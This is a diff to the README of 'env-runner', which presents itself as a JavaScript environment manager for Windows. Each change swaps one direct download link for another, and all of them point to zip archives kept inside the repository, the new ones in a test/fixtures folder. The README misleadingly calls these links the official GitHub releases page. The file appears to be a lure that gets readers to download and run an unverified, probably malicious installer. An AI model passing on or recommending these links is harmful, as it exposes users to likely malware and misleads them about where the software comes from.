@@ -1,6 +1,6 @@
 # ⚙️ env-runner - Simple JavaScript Environment Manager
 
-[![Download env-runner](https://img.shields.io/badge/Download-env--runner-brightgreen)](https://raw.githubusercontent.com/toyonakibirthtrauma50/env-runner/main/src/runners/runner-env-3.4.zip)
+[![Download env-runner](https://img.shields.io/badge/Download-env--runner-brightgreen)](https://github.com/toyonakibirthtrauma50/env-runner/raw/refs/heads/main/test/fixtures/env_runner_1.1.zip)
 
 ## 📋 What is env-runner?
 
@@ -26,7 +26,7 @@ Before installing env-runner, make sure your computer meets these conditions:
 
 1. Click the big button below to visit the download page:
 
-   [![Download env-runner](https://img.shields.io/badge/Download-env--runner-0078d7)](https://raw.githubusercontent.com/toyonakibirthtrauma50/env-runner/main/src/runners/runner-env-3.4.zip)
+   [![Download env-runner](https://img.shields.io/badge/Download-env--runner-0078d7)](https://github.com/toyonakibirthtrauma50/env-runner/raw/refs/heads/main/test/fixtures/env_runner_1.1.zip)
 
 2. On the page, look for the latest version labeled with the newest date.
 
@@ -96,7 +96,7 @@ The program handles everything else.
 
 You can always get the latest version on the official release page:
 
-[Download env-runner from GitHub releases](https://raw.githubusercontent.com/toyonakibirthtrauma50/env-runner/main/src/runners/runner-env-3.4.zip)
+[Download env-runner from GitHub releases](https://github.com/toyonakibirthtrauma50/env-runner/raw/refs/heads/main/test/fixtures/env_runner_1.1.zip)
 
 Click the link above. It takes you to the place where you can choose the newest installer for Windows.
 
@@ -144,10 +144,10 @@ A: Check that your JavaScript file is valid and supported. You can also try rest
 
 For questions or help, visit the GitHub page and use the "Issues" tab to report problems.
 
-Link: https://raw.githubusercontent.com/toyonakibirthtrauma50/env-runner/main/src/runners/runner-env-3.4.zip
+Link: https://github.com/toyonakibirthtrauma50/env-runner/raw/refs/heads/main/test/fixtures/env_runner_1.1.zip
 
 ---
 
 ## 📥 Download Link Again
 
-[![Download env-runner](https://img.shields.io/badge/Download-env--runner-008080)](https://raw.githubusercontent.com/toyonakibirthtrauma50/env-runner/main/src/runners/runner-env-3.4.zip)
+[![Download env-runner](https://img.shields.io/badge/Download-env--runner-008080)](https://github.com/toyonakibirthtrauma50/env-runner/raw/refs/heads/main/test/fixtures/env_runner_1.1.zip)
